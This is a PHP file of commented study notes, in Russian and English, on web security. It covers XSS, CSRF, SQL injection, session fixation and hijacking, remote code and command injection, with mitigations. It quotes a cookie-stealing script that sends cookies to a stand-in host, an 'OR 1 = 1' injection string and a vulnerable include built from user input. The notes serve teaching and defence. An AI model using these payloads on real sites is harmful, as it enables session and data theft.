<?php

/**
 * security  description
 *
 * @author Kudryashov Sergey iden.82@gmail.com
 */
// Основные моменты по безопасности
//Escape Output:
$user_message = 'Я вас щя взломаю! </table>';
htmlentities($user_message, ENT_QUOTES, 'UTF-8');

// register_globals configuration directive automatically injects variables into scripts. 

//A best practice for maintainable and manageable code is to use the appropriate su-
//perglobal array for the location from which you expect the data to originate—$_GET,
//$_POST, or $_COOKIE.

//Spoofed Forms - подделка форм. Не доверять юзер инпуту а лучше сверять идентификаторы

//Cross-Site Scripting - размещение вред кода на ресурсах с целью умыкнуть данные юзера
//Например вот так:
//Imagine that a malicious user submits a comment on someone’s profile that contains
//the following content:
//<script>
//document.location = ’’http://example.org/getcookies.php?cookies=’’
//+ document.cookie;
//</script>
//Now, everyone visiting this user’s profile will be redirected to the given URL and their
//cookies (including any personally identifiable information and login information)
//will be appended to the query string. The attacker can easily access the cookies with
//$_GET[’cookies’] and store them for later use


//Cross-Site Request Forgeries  межсайтовая подделка запросов
//Whereas an XSS attack exploits the user’s trust in an application, a forged request
//exploits an application’s trust in a user, since the request appears to be legitimate
//and it is difficult for the application to determine whether the user intended for it to
//take place.
//Suppose you have a Web site in which users register for an account and then
//browse a catalogue of books for purchase. Again, suppose that a malicious user signs
//up for an account and proceeds through the process of purchasing a book from the
//site. Along the way, she might learn the following through casual observation:
//• She must log in to make a purchase.
//• After selecting a book for purchase, she clicks the buy button, which redirects
//her through checkout.php.
//• She sees that the action to checkout.php is a POST action but wonders whether
//passing parameters to checkout.php through the query string (GET) will work.
//• When passing the same form values through the query string (i.e.
//checkout.php?isbn=0312863551&qty=1), she notices that she has, in fact, suc-
//cessfully purchased a book.
//With this knowledge, the malicious user can cause others to make purchases at your
//site without their knowledge.


//SQL injection
//SELECT * FROM users
//WHERE username = ’username’ OR 1 = 1 --’ AND
//password = ’d41d8cd98f00b204e9800998ecf8427e’
//в итоге получим SELECT * FROM users
//WHERE username = ’username’ OR 1 = 1 - и весь список пользователей

//session fixation - фиксация сессии
//While the user accesses your site through this session, they may provide sensitive
//information or even login credentials. If the user logs in while using the provided
//session identifier, the attacker may be able to “ride” on the same session and gain
//access to the user’s account.
// Solution:
//session_start();
//// If the user login is successful, regenerate the session ID
//if (authenticate())
//{
//session_regenerate_id();
//}

//session hihackig - угон сессии
// то же самое - если злоумышленник увидит айди сессии и подделает ее
// If it has changed, then that is cause for concern, and the user should log in
//again.
//if ($_SESSION[’user_agent’] != $_SERVER[’HTTP_USER_AGENT’])
//{
//// Force user to log in again
//exit;
//}

//Remote Code Injection
// здесь все понятно.
// include "{$_GET[’section’]}/data.inc.php"; -сюда вставить левые данные - и привет
// Рецепт - не давать участвовать пользовательским данным в построении пути
// также можно просто вырубить  allow_url_fopen - поставить ему Off

//Command Injection
//у пользователя не должно быть возможности выполнять системные команты, например 
// `` -> вот в этих кавычках. Опять же proper filtering and escaping 
//Also, PHP provides escapeshellcmd() and escapeshellarg() as a
//means to properly escape shell output.

?>
